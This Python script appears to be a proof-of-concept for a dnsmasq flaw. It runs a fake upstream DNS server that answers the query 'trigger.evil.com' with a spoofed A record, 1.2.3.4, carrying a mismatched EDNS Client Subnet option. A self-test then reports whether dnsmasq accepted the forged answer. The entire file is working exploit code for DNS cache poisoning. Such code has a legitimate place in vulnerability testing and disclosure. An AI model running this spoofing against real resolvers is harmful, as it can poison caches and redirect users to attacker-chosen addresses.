import random
import socket
import struct
import sys
import threading
import time
from typing import Tuple

# ====== setting ======
DNS_LISTEN_IP = "xxx.xxx.xxx.x"
DNS_PORT = 5353

# dnsmasq IP
DNSMASQ_IP = "127.0.0.1"
DNSMASQ_UPSTREAM_PORT = 5354

# fake IP
FAKE_IP = "1.2.3.4"

# Only answer this qname to avoid responding to unrelated multicast/local traffic
TARGET_QNAME = b"trigger.evil.com."

# Self-test: send one query to dnsmasq and see if it returns FAKE_IP.
# If dnsmasq is fixed, it should discard the mismatched ECS reply and timeout.
RUN_SELF_TEST = True
SELF_TEST_TIMEOUT = 3
VERBOSE_HEX = True


def encode_qname(name_bytes: bytes) -> bytes:
    name = name_bytes.rstrip(b".")
    if not name:
        return b"\x00"
    parts = name.split(b".")
    out = bytearray()
    for p in parts:
        out.append(len(p))
        out.extend(p)
    out.append(0)
    return bytes(out)


def parse_name(data: bytes, off: int, depth: int = 0) -> Tuple[bytes, int]:
    if depth > 10:
        raise ValueError("name compression loop")
    labels = []
    start = off
    jumped = False

    while True:
        if off >= len(data):
            raise ValueError("name out of bounds")
        length = data[off]
        if length == 0:
            off += 1
            break
        if (length & 0xC0) == 0xC0:
            if off + 1 >= len(data):
                raise ValueError("bad compression pointer")
            ptr = ((length & 0x3F) << 8) | data[off + 1]
            name, _ = parse_name(data, ptr, depth + 1)
            labels.append(name.rstrip(b"."))
            off += 2
            jumped = True
            break
        off += 1
        if off + length > len(data):
            raise ValueError("label out of bounds")
        labels.append(data[off:off + length])
        off += length

    name = b".".join(labels) + b"."
    return name, (start + 2) if jumped else off


def build_ecs_option() -> bytes:
    # RFC7871 ECS option (code 8)
    # format: family + source mask + scope mask + address
    ecs_data = b"\x00\x01"     # IPv4
    ecs_data += b"\x18"        # source prefix length = 24
    ecs_data += b"\x00"        # scope prefix length
    ecs_data += b"\x7F\x12\x00"  # fake subnet: 127.18.0.0/24

    # EDNS0 option format: code + length + data
    return b"\x00\x08" + len(ecs_data).to_bytes(2, "big") + ecs_data


def build_dns_response(qid: int, qname_wire: bytes, qtype: int, qclass: int) -> bytes:
    # Header: QR=1, AA=1
    flags = 0x8400
    header = struct.pack(">HHHHHH", qid, flags, 1, 1, 0, 1)

    question = qname_wire + struct.pack(">HH", qtype, qclass)

    # Answer: A record
    answer = (
        qname_wire
        + struct.pack(">HHI", 1, 1, 60)
        + struct.pack(">H", 4)
        + socket.inet_aton(FAKE_IP)
    )

    ecs_option = build_ecs_option()
    opt_rdata = ecs_option
    opt = (
        b"\x00"
        + struct.pack(">HHI", 41, 4096, 0)
        + struct.pack(">H", len(opt_rdata))
        + opt_rdata
    )

    return header + question + answer + opt


def parse_dns_query(data: bytes) -> dict:
    if len(data) < 12:
        raise ValueError("short DNS header")
    qid, flags, qdcount, _, _, _ = struct.unpack(">HHHHHH", data[:12])
    if qdcount != 1:
        raise ValueError("unexpected qdcount")
    qname, off = parse_name(data, 12)
    if off + 4 > len(data):
        raise ValueError("truncated question")
    qtype, qclass = struct.unpack(">HH", data[off:off + 4])
    return {
        "id": qid,
        "flags": flags,
        "qname": qname,
        "qname_wire": data[12:off],
        "qtype": qtype,
        "qclass": qclass,
    }


def handle_dns_query(data: bytes, addr: Tuple[str, int], sock: socket.socket) -> None:
    src_ip, src_port = addr
    try:
        q = parse_dns_query(data)
    except Exception as e:
        print(f"[!] Failed to parse DNS query: {e}")
        return

    if src_ip != DNSMASQ_IP:
        print(f"[!] Ignoring query from {src_ip} (not dnsmasq)")
        return
    if q["qname"] != TARGET_QNAME:
        print(f"[!] Ignoring non-target qname: {q['qname'].decode(errors='ignore')}")
        return

    print(f"[+] Received query: {q['qname'].decode()}")
    print(f"[>] Query from {src_ip}:{src_port} -> {DNSMASQ_IP}:{DNSMASQ_UPSTREAM_PORT}")
    if VERBOSE_HEX:
        print(f"[>] Query raw len={len(data)} hex={data.hex()}")

    resp = build_dns_response(q["id"], q["qname_wire"], q["qtype"], q["qclass"])
    try:
        sent = sock.sendto(resp, addr)
        print(f"[>] UDP sendto -> {src_ip}:{src_port} ({sent} bytes)")
        if b"\x00\x08" in resp:
            print("[>] EDNS0 option (code 8) present in outgoing payload")
        else:
            print("[!] EDNS0 option (code 8) NOT found in outgoing payload")
        print("[>] ECS set to 127.18.0.0/24 (mismatch expected)")
        if VERBOSE_HEX:
            print(f"[>] Reply raw len={len(resp)} hex={resp.hex()}")
        print("[+] Sent spoofed response with ECS option")
    except Exception as e:
        print("[!] UDP sendto failed:", e)


def serve_udp() -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((DNSMASQ_IP, DNSMASQ_UPSTREAM_PORT))
    except Exception as e:
        print("[!] Failed to bind UDP socket:", e)
        sys.exit(2)

    print(f"[*] Listening on {DNSMASQ_IP}:{DNSMASQ_UPSTREAM_PORT} (UDP)")
    while True:
        try:
            data, addr = sock.recvfrom(4096)
        except KeyboardInterrupt:
            print("\n[*] Stopped.")
            break
        except Exception as e:
            print("[!] recvfrom failed:", e)
            continue

        handle_dns_query(data, addr, sock)


def self_test() -> None:
    time.sleep(0.5)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(SELF_TEST_TIMEOUT)
    try:
        qid = random.getrandbits(16)
        qname_wire = encode_qname(TARGET_QNAME)
        header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
        question = qname_wire + struct.pack(">HH", 1, 1)
        query = header + question
        sock.sendto(query, (DNS_LISTEN_IP, DNS_PORT))
        data, src = sock.recvfrom(4096)

        answer_ip = None
        if len(data) >= 12:
            _, _, qd, an, _, _ = struct.unpack(">HHHHHH", data[:12])
            off = 12
            for _ in range(qd):
                _, off = parse_name(data, off)
                off += 4
            for _ in range(an):
                _, off = parse_name(data, off)
                if off + 10 > len(data):
                    break
                rtype, rclass, _, rdlen = struct.unpack(">HHIH", data[off:off + 10])
                off += 10
                if rtype == 1 and rclass == 1 and rdlen == 4 and off + 4 <= len(data):
                    answer_ip = socket.inet_ntoa(data[off:off + 4])
                    break
                off += rdlen

        print(f"[>] dnsmasq reply from {src[0]}:{src[1]}")
        print(f"[>] dnsmasq answer_ip={answer_ip}")
        if VERBOSE_HEX:
            print(f"[>] dnsmasq reply raw len={len(data)} hex={data.hex()}")
        if answer_ip == FAKE_IP:
            print("[!] VULNERABLE: dnsmasq accepted mismatched ECS reply (ECS=127.18.0.0/24)")
        else:
            print("[*] No FAKE_IP answer received (likely fixed or filtered)")
    except socket.timeout:
        print("[*] No response from dnsmasq (likely fixed or filtered)")
    except Exception as e:
        print("[!] Self-test failed:", e)
    finally:
        sock.close()


# ====== start listening ======
print("[*] Starting fake upstream DNS server...")
if RUN_SELF_TEST:
    threading.Thread(target=self_test, daemon=True).start()
serve_udp()
